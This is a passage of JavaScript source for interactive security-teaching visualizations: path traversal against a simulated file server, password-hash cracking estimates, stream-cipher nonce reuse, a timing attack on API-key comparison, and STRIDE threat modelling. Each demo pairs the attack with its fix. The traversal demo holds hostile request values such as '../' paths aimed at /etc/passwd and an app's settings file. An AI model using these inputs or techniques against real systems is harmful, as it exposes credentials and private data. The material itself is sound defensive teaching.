    legend: [["active", "current step"], ["done", "inside the uploads folder"], ["bad", "escaped"], ["path", "rejected"]],
    inputs: [
      { key: "name", label: "GET /files?name=", type: "select", options: PT_TRIES, value: "../appsettings.json" },
      { key: "def", label: "defence", type: "select", options: PT_DEF, value: "startsWith(base), not normalized" },
    ],
    random: () => ({ name: pick(PT_TRIES), def: pick(PT_DEF) }),
    build: ({ name, def }) => {
      const code = PT_CODE[def];
      const fr = [], base = { def, code, raw: name };
      fr.push({ ...base, line: -1, note: `The request is <code>GET /files?name=${esc(name)}</code>. The folder the app means to serve is <code>${BASE}</code>.` });
      if (def === PT_DEF[5]) {
        const id = name;
        fr.push({ ...base, line: 0, steps: [["id from URL", id]], note: `With opaque IDs the URL carries a <b>key</b>, not a path. The lookup is <code>Files.Find(${esc(JSON.stringify(id))})</code>.` });
        const hit = FILE_IDS[id];
        fr.push({ ...base, line: 1, steps: [["id from URL", id], ["database row", hit ? hit : "none"]], opened: hit ? BASE + "/" + hit : null, verdict: "done", head: hit ? "File served" : "404 Not Found", sub: hit ? "stored name came from the server, not the user" : "there is no row with that ID, so there is nothing to traverse", note: "The user never supplies a path, so there is no path to manipulate. The stored file name was chosen by the server at upload time (often a GUID). Add an ownership check and this also closes the BOLA hole." });
        return fr;
      }
      const decoded = decodeURIComponent(name);
      const steps = [["query string", name]];
      if (decoded !== name) steps.push(["URL-decoded by the framework", decoded]);
      fr.push({ ...base, line: -1, steps: steps.slice(), note: decoded !== name ? `The web framework <b>URL-decodes</b> the query string before your code sees it: <code>%2F</code> becomes <code>/</code>. Filters that run on the raw URL (a WAF rule looking for <code>../</code>) miss this.` : "The framework hands your code the decoded string." });
      let n2 = decoded, li = 0;
      if (def === PT_DEF[1]) {
        n2 = decoded.split("../").join("");
        steps.push(['after Replace("../", "")', n2]);
        fr.push({ ...base, line: 0, steps: steps.slice(), note: n2 !== decoded ? `Removing <code>../</code> once leaves <code>${esc(n2)}</code>. ${n2.includes("../") ? "Removing the inner <code>../</code> from <code>....//</code> <b>creates a new one</b>. Blocklist sanitizers lose this game." : ""}` : "Nothing to remove." });
        li = 1;
      }
      const abs = n2.startsWith("/");
      const joined = abs ? n2 : BASE + "/" + n2;
      steps.push(["Path.Combine(base, name)", joined]);
      fr.push({ ...base, line: li, steps: steps.slice(), note: abs ? `<b>The name is absolute</b>, so <code>Path.Combine</code> (and Python's <code>os.path.join</code>, Java's <code>Path.resolve</code>) <b>throws the base away</b> and returns <code>${esc(n2)}</code>.` : `Joined: <code>${esc(joined)}</code>. The <code>..</code> segments are still in the string; nothing has resolved them yet.` });
      const norm = normalize(joined);
      const checkStr = def === PT_DEF[2] ? joined : norm;
      if (def === PT_DEF[3] || def === PT_DEF[4]) { steps.push(["Path.GetFullPath(…)", norm]); fr.push({ ...base, line: 0, steps: steps.slice(), note: `<code>GetFullPath</code> resolves the <code>..</code> segments: <code>${esc(norm)}</code>. Now the string says where the file really is.` }); }
      if (def === PT_DEF[2] || def === PT_DEF[3] || def === PT_DEF[4]) {
        const pref = def === PT_DEF[4] ? BASE + "/" : BASE;
        const ok = checkStr.startsWith(pref);
        steps.push([`startsWith("${pref}")`, ok ? "true" : "false"]);
        fr.push({ ...base, line: def === PT_DEF[4] ? 2 : 1, steps: steps.slice(), check: ok, note: ok ? (norm.startsWith(BASE + "/") ? "Passes, and the file really is inside the folder." : def === PT_DEF[2] ? `<b>Passes</b>: the string <i>begins</i> with the base folder. The <code>..</code> after it hasn't been resolved, so the check is looking at the wrong thing.` : `<b>Passes</b>: <code>${esc(norm)}</code> starts with the characters <code>${BASE}</code>, but <code>uploads-private</code> is a <i>different folder</i>. A prefix check needs the trailing separator.`) : `Rejected: <code>${esc(checkStr)}</code> is outside <code>${esc(pref)}</code>.` });
        if (!ok) { fr.push({ ...base, line: def === PT_DEF[4] ? 2 : 1, steps: steps.slice(), check: false, opened: null, verdict: "path", head: "403 Forbidden", sub: "the resolved path is outside the folder", note: `Rejected on the <b>resolved</b> path${def === PT_DEF[4] ? ", with the separator" : ""}. ${def === PT_DEF[4] ? "This is the correct check. On a real filesystem, also resolve symlinks (<code>realpath</code> / <code>Path.ResolveLinkTarget</code>) or a link inside the folder can still point outside." : ""}` }); return fr; }
      }
      const content = FS[norm];
      steps.push(["the OS opens", norm]);
      const inside = norm.startsWith(BASE + "/");
      fr.push({ ...base, line: code.length - 1, steps: steps.slice(), opened: norm, check: undefined, verdict: content ? (inside ? "done" : "bad") : "path", head: content ? (inside ? "File served" : "File outside the folder served") : "404 Not Found", sub: content ? esc(content) : "no such file", note: content ? (inside ? `<code>${esc(norm)}</code> is inside the uploads folder. ${def === PT_DEF[0] || def === PT_DEF[1] ? "Fine for this input; try the <code>../</code> ones." : ""}` : `The operating system resolves the <code>..</code> segments and opens <code>${esc(norm)}</code>. ${norm.includes("appsettings") ? "That's the production connection string." : norm.includes("passwd") ? "The classic proof of concept: an attacker who can read any file reads your config and keys next." : "Another user's private data."}`) : "No such file." });
      return fr;
    },
    render: (f) => {
      const tree = [["/", 0, "/"], ["etc/", 1, null], ["passwd", 2, "/etc/passwd"], ["srv/app/", 1, null], ["appsettings.json", 2, "/srv/app/appsettings.json"], ["uploads/   ← base folder", 2, null, true], ["report.pdf", 3, "/srv/app/uploads/report.pdf"], ["avatars/joel.png", 3, "/srv/app/uploads/avatars/joel.png"], ["uploads-private/", 2, null], ["salaries.xlsx", 3, "/srv/app/uploads-private/salaries.xlsx"]];
      const tr = tree.map(([n, d, p, isBase]) => `<div class="sf-fs ${isBase ? "sf-base" : ""} ${p && f.opened === p ? (p.startsWith(BASE + "/") ? "done" : "bad") : ""}" style="padding-left:${d * 18 + 6}px">${esc(n)}</div>`).join("");
      const steps = (f.steps || []).map(([k, v], i, a) => `<div class="sf-kv ${i === a.length - 1 ? "cur" : ""}"><span>${esc(k)}</span><code class="${v === "false" ? "sf-koc" : ""}">${esc(v)}</code></div>`).join("");
      return `<div class="sf-split"><div class="sf-split-l">${steps || `<div class="sf-kv cur"><span>request</span><code>GET /files?name=${esc(f.raw)}</code></div>`}${f.verdict ? verdict(f.verdict, f.head, f.sub) : ""}${codePanel(f.code, "csharp", [f.line], f.def)}</div><div class="sf-split-r"><div class="sf-tree"><div class="sf-h">server filesystem</div>${tr}</div></div></div>`;
    },
  }));

  /* =====================================================================
   * 5. Password storage: real hashes, salts, and crack-time estimates.
   * ===================================================================== */
  const ALGS = [
    { k: "MD5", rate: 1.6e11, salted: false, fn: (p) => hex(md5(p)) },
    { k: "SHA-256", rate: 2.2e10, salted: false, fn: (p) => hex(sha256(p)) },
    { k: "SHA-256 + salt", rate: 2.2e10, salted: true, fn: (p, s) => hex(sha256(s + p)) },
    { k: "bcrypt, cost 10", rate: 5.7e3, salted: true, slow: true, fmt: "$2b$10$" },
    { k: "bcrypt, cost 12", rate: 1.4e3, salted: true, slow: true, fmt: "$2b$12$" },
    { k: "Argon2id, 19 MiB, t=2", rate: 1.0e3, salted: true, slow: true, fmt: "$argon2id$v=19$m=19456,t=2,p=1$" },
  ];
  const PWS = [
    { k: "123456 (a top-10 password)", pw: "123456", space: 10, how: "the first few entries of any leaked-password list", list: true },
    { k: "sunshine1 (word + digit)", pw: "sunshine1", space: 1e6, how: "a 100,000-word list × 10 digit suffixes", list: true },
    { k: "8 random lowercase", pw: "qhtvmzkb", space: Math.pow(26, 8), how: "26⁸ ≈ 2.1 × 10¹¹" },
    { k: "8 random, full keyboard", pw: "k#9Lq!2v", space: Math.pow(94, 8), how: "94⁸ ≈ 6.1 × 10¹⁵" },
    { k: "4 random words (diceware)", pw: "staple-orbit-velvet-ninety", space: Math.pow(7776, 4), how: "7776⁴ ≈ 3.7 × 10¹⁵" },
    { k: "16 random (password manager)", pw: "Vt8#qM2!zR5&wN9p", space: Math.pow(94, 16), how: "94¹⁶ ≈ 3.7 × 10³¹" },
  ];
  const b64s = (r, n) => Array.from({ length: n }, () => "./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(r() * 64)]).join("");
  Viz.register("security-fundamentals-passwords", (el) => Viz.player(el, {
    title: "Password storage: what a database leak costs your users",
    tag: "REAL HASHES · ESTIMATED GPU RATES",
    legend: [["bad", "crackable in under a day"], ["active", "days to years"], ["done", "out of reach"]],
    inputs: [
      { key: "alg", label: "how the passwords are stored", type: "select", options: ALGS.map((a) => a.k), value: "SHA-256" },
      { key: "pw", label: "Alice's password", type: "select", options: PWS.map((p) => p.k), value: PWS[1].k },
    ],
    random: () => ({ alg: pick(ALGS).k, pw: pick(PWS).k }),
    build: ({ alg, pw }) => {
      const A = ALGS.find((a) => a.k === alg), P = PWS.find((p) => p.k === pw);
      const r = rng(alg.length * 31 + pw.length);
      const users = [["alice", P.pw], ["bob", P.pw], ["carol", "correct-horse-battery-staple"]].map(([u, p]) => {
        const salt = A.salted ? (A.slow ? b64s(r, 22) : hex(Array.from({ length: 8 }, () => Math.floor(r() * 256)))) : "";
        const stored = A.slow ? `${A.fmt}${salt}…` : A.salted ? `${salt}:${A.fn(p, salt)}` : A.fn(p);
        return { u, stored, same: false };
      });
      users[0].same = users[1].same = users[0].stored === users[1].stored;
      const avg = Math.max(1, P.space / 2);
      const tUser = avg / A.rate;
      const N = 1e6;
      const tAll = A.salted ? tUser * N : tUser;
      const fr = [];
      const base = { A, P, users, tUser, tAll };
      fr.push({ ...base, stage: "store", note: `Alice and Bob happen to choose the same password, <code>${esc(P.pw)}</code>. With <b>${esc(A.k)}</b> the table stores ${A.slow ? "a self-describing string: algorithm, cost, a random salt and the hash (computed by the library; elided here)" : A.salted ? "a random per-user salt and SHA-256(salt + password): real hashes, computed in your browser" : "the hash of the password: real hashes, computed in your browser"}.` });
      fr.push({ ...base, stage: "leak", note: users[0].same ? `The database leaks. <b>Alice's and Bob's hashes are identical</b>, so the attacker knows they share a password before cracking anything. ${P.list ? "And for common passwords there's no cracking at all: the hash is already in public lookup tables." : ""}` : `The database leaks. Thanks to the salt, <b>Alice's and Bob's hashes differ</b> even though their passwords are the same. Precomputed tables are useless, and each user has to be attacked separately.` });
      fr.push({ ...base, stage: "attack", note: `A single high-end GPU tries about <b>${A.rate.toExponential(1).replace("e+", " × 10^")} ${esc(A.k)} guesses per second</b> (order-of-magnitude estimate). Alice's password sits in a space of ${P.how}; on average it is found halfway through.` });
      fr.push({ ...base, stage: "time", note: `Expected time to crack Alice: <b>${fmtDur(tUser)}</b>. ${A.salted ? `With a salt the work is per user, so all 1,000,000 users take <b>${fmtDur(tAll)}</b>.` : "Without a salt, every guess is checked against <b>all 1,000,000 users at once</b>: cracking one costs the same as cracking everyone with that password."}` });
      fr.push({ ...base, stage: "compare", note: `The bars compare every storage choice for this password. ${A.slow ? "A slow, salted, memory-hard hash turns hours into centuries for decent passwords. It can't save <code>123456</code>: that is why you also block known-breached passwords at sign-up." : "General-purpose hashes are <b>designed to be fast</b>, which is exactly wrong for passwords. Use Argon2id, scrypt or bcrypt (or PBKDF2 with a high iteration count where FIPS requires it)."}` });
      return fr;
    },
    render: (f) => {
      const rows = f.users.map((u) => `<tr class="${u.same && f.stage !== "store" ? "sf-leak" : ""}"><td>${u.u}</td><td class="sf-hash">${esc(u.stored)}</td></tr>`).join("");
      const tbl = `<table class="sf-tbl"><tr><th>user</th><th>password_hash column (${esc(f.A.k)})</th></tr>${rows}</table>`;
      const parts = [tbl];
      if (f.stage !== "store") {
        if (f.stage === "attack" || f.stage === "time" || f.stage === "compare") parts.push(stats([["guesses per second (1 GPU)", f.A.rate.toExponential(1).replace("e+", "e"), ""], ["Alice's search space", f.P.space.toExponential(1).replace("e+", "e"), ""], ["time to crack Alice", f.stage === "attack" ? "?" : fmtDur(f.tUser), f.tUser < 86400 ? "bad" : f.tUser < 3.15e9 ? "active" : "done"], ["all 1M users", f.stage === "attack" ? "?" : fmtDur(f.tAll), f.tAll < 86400 ? "bad" : f.tAll < 3.15e9 ? "active" : "done"]]));
      }
      if (f.stage === "compare") {
        const W = 640, max = Math.log10(3.15e7 * 1e12);
        let b = "";
        ALGS.forEach((a, i) => {
          const t = Math.max(1e-3, Math.max(1, f.P.space / 2) / a.rate), y = 8 + i * 30;
          const w = Math.max(4, Math.min(1, (Math.log10(t) + 3) / (max + 3)) * (W - 330));
          const c = t < 86400 ? "bad" : t < 3.15e9 ? "active" : "done";
          b += txt(170, y + 15, a.k, a.k === f.A.k ? "sf-t" : "small", "end") + `<rect class="box ${c}" x="180" y="${y + 2}" width="${w}" height="18" rx="3" ${a.k === f.A.k ? 'stroke-width="2.5"' : ""}/>` + txt(186 + w, y + 15, fmtDur(t), "small mono");
        });
        parts.push(svg(W, 8 + ALGS.length * 30, b, "Crack time by algorithm"));
      }
      return `<div class="sf-col">${parts.join("")}</div>`;
    },
  }));

  /* =====================================================================
   * 6. Nonce reuse in a stream cipher (AES-CTR, and the CTR part of AES-GCM).
   *    The keystream here is SHA-256(key | nonce | counter); the XOR algebra is identical.
   * ===================================================================== */
  const keystream = (key, nonce, len) => {
    const out = [];
    for (let ctr = 0; out.length < len; ctr++) out.push(...sha256(`${key}|${nonce}|${ctr}`));
    return out.slice(0, len);
  };
  const NONCE_MODES = ["fixed nonce (the bug)", "random 96-bit nonce per message", "counter per key"];
  Viz.register("security-fundamentals-nonce", (el) => Viz.player(el, {
    title: "Nonce reuse: two ciphertexts, one keystream, no secrets",
    tag: "REAL XOR · STEP THROUGH",
    legend: [["visit", "keystream"], ["active", "ciphertext"], ["bad", "recovered plaintext"], ["done", "still noise"]],
    inputs: [
      { key: "mode", label: "nonce policy", type: "select", options: NONCE_MODES, value: NONCE_MODES[0] },
      { key: "known", label: "message 1 (the attacker knows or guesses it)", value: "{\"to\":\"alice\",\"amount\":100}", width: 260 },
      { key: "secret", label: "message 2 (secret)", value: "{\"pin\":\"4071\",\"card\":\"4111\"}", width: 260 },
    ],
    random: () => ({ mode: pick(NONCE_MODES), known: pick(["GET /api/v1/orders HTTP/1.1", "{\"to\":\"alice\",\"amount\":100}", "Hello, this is a test message"]), secret: pick(["{\"pin\":\"4071\",\"card\":\"4111\"}", "password=hunter2&user=joel", "launch code 0000"]) }),
    build: ({ mode, known, secret }) => {
      if (!known || !secret) throw new Error("Both messages need some text.");
      if (known.length > 40 || secret.length > 40) throw new Error("Keep each message to 40 characters or fewer.");
      const p1 = Array.from(utf8(known)), p2 = Array.from(utf8(secret));
      const r = rng(known.length * 7 + secret.length);
      const n1 = mode === NONCE_MODES[2] ? "000000000000000000000001" : hex(Array.from({ length: 12 }, () => Math.floor(r() * 256)));
      const n2 = mode === NONCE_MODES[0] ? n1 : mode === NONCE_MODES[2] ? "000000000000000000000002" : hex(Array.from({ length: 12 }, () => Math.floor(r() * 256)));
      const key = "k3y-0f-th3-s3rv1c3";
      const k1 = keystream(key, n1, p1.length), k2 = keystream(key, n2, p2.length);
      const c1 = p1.map((b, i) => b ^ k1[i]), c2 = p2.map((b, i) => b ^ k2[i]);
      const L = Math.min(c1.length, c2.length);
      const x = c1.slice(0, L).map((b, i) => b ^ c2[i]);
      const rec = x.map((b, i) => b ^ p1[i]);
      const hit = rec.filter((b, i) => b === p2[i]).length;
      const same = n1 === n2;
      const base = { p1, p2, k1, k2, c1, c2, x, rec, n1, n2, same, L, mode };
      return [
        { ...base, show: ["p1"], note: `Message 1 is something the attacker knows or can guess: a fixed JSON shape, an HTTP header, their own message. Message 2 is secret. Both are encrypted with the same key.` },
        { ...base, show: ["p1", "k1", "c1"], note: `Message 1: keystream from (key, nonce <code>${n1.slice(0, 8)}…</code>), XORed byte by byte. C₁ = P₁ ⊕ KS(n₁).` },
        { ...base, show: ["p1", "k1", "c1", "p2", "k2", "c2"], note: same ? `Message 2 uses <b>the same nonce</b>, so it gets <b>the same keystream</b> (compare the two keystream rows). C₂ = P₂ ⊕ KS(n₁).` : `Message 2 gets a different nonce (<code>${n2.slice(0, 8)}…</code>), so its keystream is unrelated to the first one.` },
        { ...base, show: ["c1", "c2", "x"], note: `The attacker XORs the two ciphertexts. ${same ? "The keystream cancels out: C₁ ⊕ C₂ = P₁ ⊕ P₂. No key needed." : "The keystreams don't cancel: C₁ ⊕ C₂ = P₁ ⊕ P₂ ⊕ KS(n₁) ⊕ KS(n₂), which is noise."}` },
        { ...base, show: ["x", "p1", "rec"], verdict: same ? "bad" : "done", head: same ? `${hit} of ${L} secret bytes recovered` : `${hit} of ${L} bytes match (chance)`, sub: same ? esc(String.fromCharCode(...rec.map((b) => (b >= 32 && b < 127 ? b : 46)))) : "nothing learned", note: same ? `XOR with the known message 1 and <b>message 2 appears</b>. With AES-GCM it's worse: a repeated nonce also leaks the authentication key, so the attacker can forge messages. Never reuse a nonce with the same key. Use a random 96-bit nonce (and rotate keys well before ~2³² messages) or a counter, or a nonce-misuse-resistant mode such as AES-GCM-SIV.` : `Unique nonces, unique keystreams: the XOR reveals nothing. ${mode === NONCE_MODES[1] ? "Random 96-bit nonces are safe for up to about 2³² messages per key; after that, the chance of a collision becomes significant." : "A counter never repeats, but it must survive restarts and must not be shared between servers that use the same key."}` },
      ];
    },
    render: (f) => {
      const ROWS = { p1: ["P₁ message 1", f.p1, "text"], k1: ["KS(n₁)", f.k1, "ks"], c1: ["C₁", f.c1, "ct"], p2: ["P₂ message 2", f.p2, "text"], k2: [`KS(n₂)${f.same ? " = KS(n₁)!" : ""}`, f.k2, "ks"], c2: ["C₂", f.c2, "ct"], x: ["C₁ ⊕ C₂", f.x, "x"], rec: ["⊕ P₁ = ?", f.rec, "rec"] };
      const cell = (b, kind, i) => {
        const ch = b >= 32 && b < 127 ? String.fromCharCode(b) : "·";
        const show = kind === "text" || kind === "rec" ? ch : b.toString(16).padStart(2, "0");
        const cls = kind === "ks" ? "visit" : kind === "ct" ? "active" : kind === "rec" ? (b === f.p2[i] && f.same ? "bad" : "done") : kind === "x" ? "" : "plain";
        return `<span class="sf-b ${cls}">${esc(show)}</span>`;
      };
      const rows = f.show.map((k) => { const [lab, arr, kind] = ROWS[k]; return `<div class="sf-brow"><span class="sf-blab">${esc(lab)}</span><div class="sf-bytes">${arr.map((b, i) => cell(b, kind, i)).join("")}</div></div>`; }).join("");
      return `<div class="sf-col"><div class="sf-kv"><span>nonce 1</span><code>${f.n1}</code><span>nonce 2</span><code class="${f.same ? "sf-koc" : ""}">${f.n2}</code></div><div class="sf-bgrid">${rows}</div>${f.verdict ? verdict(f.verdict, f.head, f.sub) : ""}</div>`;
    },
  }));

  /* =====================================================================
   * 7. Timing attack on an early-exit comparison.
   *    Each byte that matches costs ~1 ns more. The attacker averages N
   *    samples per guess; the mean's noise is sigma / sqrt(N).
   * ===================================================================== */
  const HEXC = "0123456789abcdef".split("");
  const T_CMP = ["early-exit loop (==)", "constant-time (FixedTimeEquals)"];
  const T_NOISE = [["local benchmark (σ ≈ 5 ns)", 5], ["same data centre (σ ≈ 50 ns)", 50], ["over the internet (σ ≈ 500 ns)", 500]];
  const T_N = ["10", "1,000", "100,000"];
  const T_CODE = {
    [T_CMP[0]]: ["bool Equal(byte[] a, byte[] b) {", "  if (a.Length != b.Length) return false;", "  for (int i = 0; i < a.Length; i++)", "    if (a[i] != b[i]) return false;   // leaves early", "  return true;", "}"],
    [T_CMP[1]]: ["// .NET: CryptographicOperations.FixedTimeEquals(a, b)", "int diff = a.Length ^ b.Length;", "for (int i = 0; i < Math.Min(a.Length, b.Length); i++)", "  diff |= a[i] ^ b[i];   // always visits every byte", "return diff == 0;"],
  };
  const gauss = (r) => Math.sqrt(-2 * Math.log(r() + 1e-12)) * Math.cos(2 * Math.PI * r());
  Viz.register("security-fundamentals-timing", (el) => Viz.player(el, {
    title: "Timing attack: reading a secret one character at a time",
    tag: "STATISTICAL SIMULATION · STEP THROUGH",
    legend: [["done", "attacker's pick, correct"], ["bad", "attacker's pick, wrong"], ["visit", "other guesses"]],
    inputs: [
      { key: "cmp", label: "server compares the API key with", type: "select", options: T_CMP, value: T_CMP[0] },
      { key: "noise", label: "network noise", type: "select", options: T_NOISE.map((n) => n[0]), value: T_NOISE[1][0] },
      { key: "n", label: "samples per guess", type: "select", options: T_N, value: "100,000" },
    ],
    random: () => ({ cmp: pick(T_CMP), noise: pick(T_NOISE)[0], n: pick(T_N) }),
    build: ({ cmp, noise, n }) => {
      const sigma = T_NOISE.find((x) => x[0] === noise)[1], N = Number(n.replace(/,/g, "")), sd = sigma / Math.sqrt(N);
      const ct = cmp === T_CMP[1];
      const r = rng(sigma * 7 + N + (ct ? 3 : 0));
      const secret = "c0ffee42";
      const code = T_CODE[cmp];
      let known = "";
      const fr = [{ code, cmp, secret, known, sd, N, sigma, line: ct ? 3 : 3, note: `The server checks an 8-character API key. ${ct ? "This version XORs every byte and ORs the differences together, so it does the same work whether the first byte or the last one is wrong." : "This version returns as soon as a byte differs. A guess with the right first character survives one more loop iteration, and takes about <b>1 ns longer</b>."} The attacker sends ${n} requests per guess and averages the response times (remaining noise σ/√N ≈ <b>${sd < 1 ? sd.toFixed(2) : sd.toFixed(1)} ns</b>).` }];
      for (let pos = 0; pos < 8; pos++) {
        const bars = HEXC.map((ch) => {
          const guess = known + ch;
          let match = 0;
          while (match < guess.length && guess[match] === secret[match]) match++;
          const work = ct ? 8 : Math.min(match + 1, 8);
          return { ch, t: 40 + work * 1 + sd * gauss(r), ok200: guess === secret };
        });
        const best = bars.find((b) => b.ok200) || bars.reduce((a, b) => (b.t > a.t ? b : a));
        const right = best.ch === secret[pos];
        const wasOnTrack = known === secret.slice(0, pos);
        known += best.ch;
        fr.push({ code, cmp, secret, known, bars, pos, best: best.ch, right, sd, N, sigma, line: ct ? 3 : 3, note: `Position ${pos + 1}: 16 guesses × ${n} requests. ${best.ok200 ? `The guess <code>${known}</code> gets <b>200 OK</b>: the last character needs no timing at all` : `The slowest mean is <code>${best.ch}</code>`}${right ? ", which is correct" : `, but the real character is <code>${secret[pos]}</code>`}. ${!wasOnTrack ? "An earlier pick was already wrong, so no guess gets further than that byte: every bar is the same height plus noise." : ct ? "Every guess does identical work; the tallest bar is just noise." : right ? (sd < 0.3 ? "The 1 ns signal stands well clear of the noise." : "The signal is close to the noise; this one went the attacker's way.") : "The noise is bigger than the 1 ns signal, so the attacker needs more samples (a real attacker would notice the bars are flat and retry)."}` });
      }
      const ok = known === secret;
      const reqs = 16 * 8 * N;
      fr.push({ code, cmp, secret, known, sd, N, sigma, reqs, line: -1, verdict: ok ? "bad" : "done", head: ok ? "API key recovered" : "Key not recovered", sub: `guessed ${known}, actual ${secret}, ${reqs.toLocaleString("en-US")} requests`, note: ok ? `With an early exit the key fell in 16 × 8 × ${n} requests instead of 16⁸ ≈ 4.3 billion guesses. Rate limiting raises the price but doesn't fix the leak. Compare secrets, MACs and tokens with a constant-time function. Better still, store a hash of the API key and compare hashes: an attacker who controls the input can't steer the hash byte by byte.` : ct ? "The constant-time comparison leaks nothing about the prefix, so the best the attacker can do is guess all 16⁸ ≈ 4.3 billion keys." : `Not this time: noise of ${sd.toFixed(1)} ns drowned a 1 ns signal. Don't rely on that; attackers can buy more samples, and a remote timing attack over a LAN has been shown in practice.` });
      return fr;
    },
    render: (f) => {
      const keyRow = `<div class="sf-kv"><span>recovered so far</span><code class="sf-big">${f.secret.split("").map((c, i) => (i < f.known.length ? `<span class="${f.known[i] === c ? "sf-okc" : "sf-koc"}">${f.known[i]}</span>` : "·")).join("")}</code><span>actual key (hidden from the attacker)</span><code class="sf-big">${f.secret}</code></div>`;
      let chart = "";
      if (f.bars) {
        const W = 560, H = 190, lo = Math.min(...f.bars.map((b) => b.t)), hi = Math.max(...f.bars.map((b) => b.t)), span = Math.max(hi - lo, 0.5);
        let b = txt(8, 14, `mean response time per guess, position ${f.pos + 1} (axis: ${lo.toFixed(1)} – ${hi.toFixed(1)} ns)`, "small");
        f.bars.forEach((bar, i) => {
          const h = 20 + ((bar.t - lo) / span) * 120, x = 20 + i * 33, y = H - 24 - h;
          const c = bar.ch === f.best ? (f.right ? "done" : "bad") : "visit";
          b += `<rect class="box ${c}" x="${x}" y="${y}" width="24" height="${h}" rx="2"/>` + txt(x + 12, H - 8, bar.ch, `sf-t mono${bar.ch === f.secret[f.pos] ? " sf-okc" : ""}`, "middle");
        });
        chart = svg(W, H, b, "Response time bar chart");
      }
      return `<div class="sf-split"><div class="sf-split-l">${keyRow}${chart}${f.verdict ? verdict(f.verdict, f.head, f.sub) : ""}</div><div class="sf-split-r">${codePanel(f.code, "csharp", [f.line], f.cmp)}${stats([["noise after averaging", `${f.sd < 1 ? f.sd.toFixed(2) : f.sd.toFixed(1)} ns`, f.sd < 0.3 ? "bad" : f.sd < 1.5 ? "active" : "done"], ["signal per matching byte", "1 ns", ""]])}</div></div>`;
    },
  }));

  /* =====================================================================
   * 8. STRIDE per element on a data-flow diagram.
   * ===================================================================== */
  const DFD = [
    { id: "user", k: "Customer (external entity)", kind: "ext", x: 20, y: 70, w: 120, h: 50 },
    { id: "f1", k: "Flow: browser → API (HTTPS)", kind: "flow", line: [140, 95, 250, 95] },
    { id: "api", k: "Orders API (process)", kind: "proc", x: 250, y: 60, w: 130, h: 70 },
    { id: "f2", k: "Flow: API → database", kind: "flow", line: [380, 80, 500, 40] },
    { id: "db", k: "Orders DB (data store)", kind: "store", x: 500, y: 20, w: 130, h: 40 },
    { id: "f3", k: "Flow: API → payment provider", kind: "flow", line: [380, 115, 500, 150] },
    { id: "pay", k: "Payment provider (external entity)", kind: "ext", x: 500, y: 130, w: 130, h: 50 },
  ];
  const STRIDE = {
    S: ["Spoofing", "authenticity"], T: ["Tampering", "integrity"], R: ["Repudiation", "non-repudiation"],
    I: ["Information disclosure", "confidentiality"], D: ["Denial of service", "availability"], E: ["Elevation of privilege", "authorization"],
  };
  const APPLIES = { ext: "SR", proc: "STRIDE", store: "TRID", flow: "TID" };
  const THREATS = {
    user: { S: ["An attacker logs in as the customer with a stuffed or phished password.", "MFA or passkeys; breached-password checks; login rate limits."], R: ["The customer says “I never placed that order.”", "Signed audit events tied to an authenticated session; order confirmation emails."] },
    f1: { T: ["A proxy on café Wi-Fi rewrites the order total in flight.", "TLS everywhere, HSTS; the server recomputes totals from its own prices."], I: ["Session cookies are sniffed on plain HTTP.", "TLS only; cookies marked Secure, HttpOnly, SameSite."], D: ["A bot floods POST /orders.", "Rate limits per account and IP; a WAF/CDN in front."] },
    api: { S: ["A caller forges a JWT signed with alg=none or a guessed secret.", "Validate signature, issuer, audience and expiry with a vetted library."], T: ["Mass assignment sets status=paid in the request body.", "Bind to explicit DTOs; never bind directly to entities."], R: ["Admins change prices and no one can tell who did it.", "Append-only audit log with who/what/when, kept outside the app's write access."], I: ["Stack traces and connection strings in 500 responses.", "ProblemDetails with a correlation ID; details only in logs."], D: ["A regex with catastrophic backtracking pins the CPU.", "Timeouts on regex, request size limits, bulkheads."], E: ["GET /orders/{id} returns other customers' orders (BOLA).", "Check ownership on every object access; deny by default."] },
    f2: { T: ["SQL injection rewrites the query in flight.", "Parameterized queries only."], I: ["Database traffic is unencrypted inside the VNet.", "TLS to the database; private endpoints."], D: ["One slow report query exhausts the connection pool.", "Pool limits, timeouts, a read replica for reports."] },
    db: { T: ["A compromised API credential deletes rows.", "Least-privilege DB user (no DDL, no DELETE where not needed); backups with point-in-time restore."], R: ["Rows change and there's no history.", "Temporal tables or change data capture."], I: ["A backup file sits in a public bucket.", "Encrypt at rest; private storage; access reviews."], D: ["Disk fills up with logs.", "Quotas, alerts on free space, retention policies."] },
    f3: { T: ["A webhook “payment succeeded” is forged by anyone who finds the URL.", "Verify the provider's webhook signature; re-fetch the payment status server-side."], I: ["Card numbers pass through your logs.", "Use the provider's hosted fields or tokens; card data never touches your servers."], D: ["The provider is slow and requests pile up.", "Timeouts, a circuit breaker, a queue for retries."] },
    pay: { S: ["A fake provider endpoint (DNS or config tampering) collects payments.", "Pin the provider host in configuration; TLS certificate validation on."], R: ["The provider says a refund was never requested.", "Idempotency keys and stored request/response receipts."] },
  };
  const ST_OPTS = ["walk every element", ...DFD.map((d) => d.k)];
  Viz.register("security-fundamentals-stride", (el) => Viz.player(el, {
    title: "STRIDE per element: threat modeling a checkout",
    tag: "THREAT MODEL · STEP THROUGH",
    legend: [["active", "element under review"], ["bad", "threat"], ["done", "mitigation"]],
    inputs: [{ key: "focus", label: "element", type: "select", options: ST_OPTS, value: ST_OPTS[0], width: 280 }],
    random: () => ({ focus: pick(ST_OPTS) }),
    build: ({ focus }) => {
      const fr = [{ cur: null, note: "A data-flow diagram of a checkout: external entities (rectangles), a process (rounded), a data store (open-ended) and data flows (arrows). The dashed line is the <b>trust boundary</b>: everything crossing it is attacker-controllable. STRIDE asks six questions of each element, and each element type only gets the questions that apply to it." }];
      const els = focus === ST_OPTS[0] ? DFD : DFD.filter((d) => d.k === focus);
      let count = 0;
      els.forEach((d) => {
        const letters = APPLIES[d.kind].split("");
        if (focus === ST_OPTS[0]) {
          count += letters.length;
          fr.push({ cur: d.id, letters, note: `<b>${esc(d.k)}</b>: ${d.kind === "ext" ? "external entities can be spoofed and can deny their actions" : d.kind === "proc" ? "processes are subject to all six" : d.kind === "store" ? "data stores can be tampered with, read, filled up, and (for logs) disputed" : "data flows can be tampered with, read, and flooded"} (${letters.join(", ")}). Top threat: ${esc(THREATS[d.id][letters[0]][0])}`, list: letters.map((l) => [l, ...THREATS[d.id][l]]) });
        } else {
          letters.forEach((l, i) => fr.push({ cur: d.id, letters, on: l, list: letters.slice(0, i + 1).map((x) => [x, ...THREATS[d.id][x]]), note: `<b>${STRIDE[l][0]}</b> (violates ${STRIDE[l][1]}): ${esc(THREATS[d.id][l][0])} <br>Mitigation: ${esc(THREATS[d.id][l][1])}` }));
        }
      });
